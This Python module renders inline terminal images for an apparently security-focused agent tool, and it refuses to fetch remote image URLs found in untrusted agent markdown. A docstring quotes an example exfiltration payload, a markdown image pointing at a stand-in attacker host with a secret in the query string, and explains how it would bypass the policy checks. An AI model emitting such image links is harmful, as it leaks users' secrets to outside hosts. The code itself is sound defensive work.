"""Inline terminal graphics for trusted agent markdown.

Emits kitty graphics protocol sequences (Ghostty + kitty) and the
iTerm2 inline-image escape when the active terminal supports them.
Untrusted/tool-relayed content must never call these helpers — see
`tui.inline.render.quarantine`.
"""

from __future__ import annotations

import base64
import mimetypes
import os
from pathlib import Path
from urllib.parse import unquote, urlparse

from capabledeputy.cli.terminal_caps import caps

_KITTY_FORMAT_BY_SUFFIX: dict[str, int] = {
    ".png": 100,
    ".jpg": 100,
    ".jpeg": 100,
    ".gif": 100,
    ".webp": 100,
}

_MAX_INLINE_BYTES = 4 * 1024 * 1024
_CHUNK_SIZE = 4096


def inline_graphics_enabled() -> bool:
    """True when inline kitty/iTerm image escapes should be emitted.

    MCP hosts (Grok, Codex, Claude Code) usually spawn the control server
    with piped stdio, so ``stdout.isatty()`` is false even when the
    operator's outer terminal is Ghostty. In that case we still trust
    ``TERM_PROGRAM`` / ``TERM`` when explicitly enabled via
    ``CAPDEP_TERMINAL_MEDIA`` or when the detected family is a known
    graphics-capable terminal.
    """
    c = caps()
    graphics_capable = c.family in {"ghostty", "kitty", "iterm2"} or c.graphics_sixel
    if not graphics_capable:
        return False
    if c.is_tty:
        return True
    flag = (os.environ.get("CAPDEP_TERMINAL_MEDIA") or "").strip().lower()
    if flag in {"1", "true", "yes", "on"}:
        return True
    if flag in {"0", "false", "no", "off"}:
        return False
    # Inherited Ghostty/kitty env on a piped MCP subprocess — escapes are
    # intended for the outer terminal when the host prints tool text raw.
    return c.family in {"ghostty", "kitty", "iterm2"}


def resolve_trusted_image_source(src: str) -> Path | None:
    """Resolve a markdown image target to a local file path, if safe.

    Agent-authored markdown is UNTRUSTED (the planner sits outside the TCB),
    so a remote `http(s)` image target is NEVER dereferenced here: doing so
    fires an outbound request to a planner-chosen host — an exfiltration
    channel (`![x](http://attacker/?d=<secret>)`) that bypasses the policy
    chokepoint and the information-flow taint engine entirely (#292). Only
    local files are resolved for inline rendering; remote targets return
    None and render as an "image unavailable" placeholder. If remote inline
    images are ever wanted, they must be fetched through `web.fetch` so the
    destination-gated egress rules apply.
    """
    raw = (src or "").strip()
    if not raw or raw.startswith("data:"):
        return None
    if raw.startswith(("http://", "https://")):
        return None
    if raw.startswith("file://"):
        parsed = urlparse(raw)
        path = Path(unquote(parsed.path))
    else:
        path = Path(os.path.expanduser(raw))
        if not path.is_absolute():
            path = Path.cwd() / path
    try:
        resolved = path.resolve(strict=True)
    except OSError:
        return None
    if not resolved.is_file():
        return None
    if resolved.stat().st_size > _MAX_INLINE_BYTES:
        return None
    mime, _ = mimetypes.guess_type(resolved.name)
    if mime and not mime.startswith("image/"):
        return None
    return resolved


def kitty_image_sequence(path: Path, *, max_cols: int = 72) -> str:
    """Return a kitty graphics protocol escape sequence for ``path``."""
    data = path.read_bytes()
    suffix = path.suffix.lower()
    fmt = _KITTY_FORMAT_BY_SUFFIX.get(suffix, 100)
    encoded = base64.standard_b64encode(data).decode("ascii")
    parts: list[str] = []
    offset = 0
    while offset < len(encoded):
        chunk = encoded[offset : offset + _CHUNK_SIZE]
        offset += _CHUNK_SIZE
        more = 1 if offset < len(encoded) else 0
        header = f"a=T,f={fmt},c={max_cols},m={more};"
        parts.append(f"\x1b_G{header}{chunk}\x1b\\")
    return "".join(parts)


def iterm2_image_sequence(path: Path, *, height_cells: int = 18) -> str:
    data = base64.b64encode(path.read_bytes()).decode("ascii")
    name = path.name.replace(";", "_")
    return (
        f"\x1b]1337;File=name={name};inline=1;width=auto;"
        f"height={height_cells};preserveAspectRatio=1:{data}\x07"
    )


def emit_inline_image(path: Path, *, max_cols: int = 72) -> str:
    """Pick the best inline-image protocol for the active terminal."""
    if not inline_graphics_enabled():
        return ""
    c = caps()
    if c.family in {"ghostty", "kitty"} or c.graphics_kitty:
        return kitty_image_sequence(path, max_cols=max_cols)
    if c.family == "iterm2":
        return iterm2_image_sequence(path)
    return ""
